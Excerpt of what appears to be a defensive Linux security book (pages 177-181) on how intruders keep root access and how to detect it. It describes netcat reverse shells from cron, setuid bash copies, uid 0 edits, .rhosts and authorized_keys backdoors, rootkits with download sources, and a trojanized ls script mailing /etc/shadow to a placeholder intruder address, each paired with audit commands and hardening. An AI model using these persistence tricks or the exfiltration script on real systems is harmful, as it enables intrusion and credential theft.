- pgno: 177
  md: 'Alternatively, an intruder may add an entry to root''s crontab file and use
    Netcat (nc) to routinely initiate an outbound connection to an external host and
    serve a shell. Of course, the host must be configured to listen for an inbound
    connection using Netcat''s -1 option.


    # # Prevent Remote Shell Service Installations


    The following actions help prevent and detect remote shell service installations:


    +   - Tighten your firewall rules as much as possible. Make sure also to restrict
    outgoing connections. For example, a host whose only purpose is to act as a web
    server must not be allowed to initiate outbound connections on any port.

    +   - Disable and uninstall xinetd or inetd if no relevant services are in use.

    +   - Use netstat to check what ports a host is listening on and their associated
    processes:


    ```

    ```

    netstat -nap

    ```

    ```


    # # Setuid and Setgid Shells Owned by root


    Setuid and setgid programs run with the privileges of the file owner or group.
    An intruder who has gained root privileges may place a copy of /bin/bash in a
    different location and use the chmod command with the +s parameter to set the
    setuid flag on it. After this is done, the intruder may log in again with a nonroot
    account and simply run the setuid''s bash executable to obtain a root shell.


    > It is a good idea to routinely audit the file system for setuid and setgid executables.
    To find setuid files, run


    ```

    ```

    find / -perm -4000 -type f -print 2>/dev/null

    ```

    ```


    To find setgid files, run


    ```

    ```

    find / -perm -2000 -type f -print 2>/dev/null

    ```

    ```


    # # Changing a Local Account''s uid to 0


    The root account has a uid (user id) equal to 0. If another account''s uid is
    set to 0, this account will gain root privileges.


    # ## Assign a Local User a uid of 0


    Consider the following entry in /etc/passwd for the user joe:


    ```

    ```joe:x:500:500::/home/joe:/bin/bash```

    ```


    ![](img/77287f6ef97ef0bed6e23f6610950d06_177_0.png)'
  merge: -1
  img_proc: true
- pgno: 178
  md: 'An attacker who has gained root privileges may change the preceding entry in
    /etc/passwd to:


    ```

    joe::x:0:0::/home/joe:/bin/bash

    ```


    This will provide superuser privileges to the user “joe.” All the intruder needs
    to do now is ensure continued access to the “joe” account.


    # Audit /etc/passwd


    Routinely audit /etc/passwd to make sure only root has his or her uid and gid
    set to 0.


    # .rhosts


    Users often place an .rhosts file in their home directory in order to facilitate
    password-free logins from remote hosts. This mechanism can be abused by intruders
    to maintain continued access to a victim host without the need of a password.


    # Abuse .rhosts in Order to Ensure Continued root Access


    An intruder may place the following .rhosts file in / or /root:


    ```

    intruder’s_ip_address +

    ```


    This will enable the intruder to rlogin from his or her host as root without a
    password.


    # Audit for .rhosts and Consider SSH


    If you are running r-services, the following suggestions are strongly recommended:


    +   ▪ Consider using SSH as a replacement for rlogin and other r-services.


    +   ▪ If you must leave login and other r-services enabled, perform routine audits
    against the presence of malicious .rhosts files by using the find command:


    ```

    find / -name .rhosts -print

    ```


    > An attacker may also add an entry in /etc/hosts.equiv that provides the same
    functionality as .rhosts. It is a good idea to inspect this file routinely. Remove
    /etc/hosts.equiv if not in use.'
  merge: -1
  img_proc: true
- pgno: 179
  md: '# SSH''s authorized_keys


    If the victim host is running an SSH server, an intruder may maintain access to
    it by placing his public key in root''s .ssh directory. SSH will trust this public
    key and allow the intruder to log in provided that the intruder has the relevant
    private key.


    # Abuse SSH''s Authorized_Keys Mechanism to Ensure Continued root Access


    The intruder may create the required public and private key pair by using the
    ssh-keygen program on his or her host:


    ```

    ```

    [bash]$ ssh-keygen -t rsa

    Generating public/private rsa key pair.

    Enter file in which to save the key (/home/intruder/.ssh/id_rsa):

    Created directory ''/home/intruder/.ssh''.

    Enter passphrase (empty for no passphrase): [enter]

    Enter same passphrase again: [enter]

    Your identification has been saved in /home/intruder/.ssh/id_rsa.

    Your public key has been saved in /home/intruder/.ssh/id_rsa.pub.

    The key fingerprint is:

    38:3c:7b:db:05:00:10:62:25:57:5c:b8:85:05:9a:a9 intruder@intruderoshost

    ```


    ```


    Now, the intruder must copy the contents of .ssh/id_rsa.pub to .ssh/authorized_keys
    on the victim host. Once this is done, the intruder may SSH into the victim host
    with no password:


    ```

    ```

    [bash]$ ssh root@victim''s_ip_address

    Last login: Sun Mar 30 02:23:48 2003 from intruder''s_host

    [bash]#

    ```


    ```


    # Do Not Allow root to Log in via SSH


    Do not allow root to log in via SSH. To enforce this rule, edit sshd_config and
    make sure the following line is present:


    PermitRootLogin no


    # Loki2


    Loki2 is a freely available tool that is often used by intruders to install backdoors.
    It uses ICMP_ECHO and ICMP_REPLY packets to tunnel shell commands. This makes
    it extremely difficult to detect, since its packets may seem like ICMP traffic
    generated by the ping tool.'
  merge: -1
  img_proc: true
- pgno: 180
  md: 'More information about Loki2 can be obtained at http://www.phrack.com/show.php?p=51&a=6.


    # Tighten Firewall Rules


    Configure your firewall to drop incoming ICMP echo requests and outgoing ICMP
    echo replies. Also, block all incoming and outgoing UDP traffic unless required.


    # TROJANS


    Hackers often place modified binaries of various commands on the victim hosts.
    Such modified binaries appear to run normally, but they surreptitiously perform
    malicious commands on behalf of the intruder.


    # Trojanize Common Commands


    An intruder may replace the /bin/ls binary with the following script:


    ```

    ```bash

    #!/bin/bash

    cat /etc/shadow | mail intruder@intruders_email

    /bin/ls.old

    ```

    ```


    This script e-mails the /etc/shadow file to the intruder. Of course, this is successful
    only when the root user executes it. Note that the script calls the original ls
    binary (saved as /bin/ls.old). This makes it difficult for the victim users to
    detect it. Such modified binaries are called Trojans.


    These are the binaries that are most often Trojanized by intruders:


    +   arp, cat, chfn, chsh, crontab, du, iconfig, finger, find, killall, more, locate,
    login, ls, lsof, passwd, pidof, ps, route, netstat, tail, tcpd, tcpspam, top,
    w, who, syslogd.


    See “Common Commands” in the Reference Center of this book for descriptions of
    many of these commands.


    # Detect Trojans


    Please see “Detect Rootkits.”


    # ROOTKITS


    Intruders do not have to go through too much trouble in order to collect and install
    Trojans and backdoors. All they have to do is to search the web for rootkits.
    Rootkits are packages consisting of ready-made Trojans'
  merge: -1
  img_proc: true
- pgno: 181
  md: 'for the hacker''s convenience. They also contain other tools that enable an
    intruder to automatically clean log files, install backdoors, and employ tools
    such as network sniffers. The following hacks describe a few popular rootkits
    that are freely available online.


    # Adore


    The Adore rootkit is a collection of Linux Kernel Modules that enable an intruder
    to hide processes, files, and network device details. It also includes a root
    shell backdoor. Adore is available from [http://www.team-teso.net/releases.php](http://www.team-teso.net/releases.php).


    # Linux Rootkit (LRK)


    The most popular Linux rootkit, the LRK contains many Trojanized binaries of common
    commands including but not limited to: chfn, chsh, crontab, du, find, ifconfig,
    inetd, killall, login, ls, netstat, passwd, pidof, ps, rshd, syslogd, tcpd, top,
    sshd, and su. It also includes a sniffer, as well as root shell backdoors. LRK
    is available from [http://www.packetstormsecurity.org/](http://www.packetstormsecurity.org/).


    # Tornkit


    Tornkit consists of various Trojan binaries, sniffing tools, and tools that perform
    automated disabling of syslogd and other critical services. It can be downloaded
    from [http://www.packetstormsecurity.org/](http://www.packetstormsecurity.org/).


    # Knark


    Knark is a rootkit that hides files and processes and also has the ability to
    redirect commands. It includes a backdoor to remotely execute commands. Knark
    is available from [http://www.packetstormsecurity.org/](http://www.packetstormsecurity.org/).


    # Detect Rootkits


    The following tools can be used to detect rootkits and Trojans:


    +   - Chkrootkit can be used to check for rootkits on a system. It is available
    from [http://www.chkrootkit.org/](http://www.chkrootkit.org/).


    +   - Use Tripwire or Samhain to detect modified binaries. See [http://www.tripwire.com/](http://www.tripwire.com/)
    for more details about Tripwire. Information about Samhain can be obtained at
    [http//samhain.sourceforge.net/](http//samhain.sourceforge.net/).'
  merge: -1
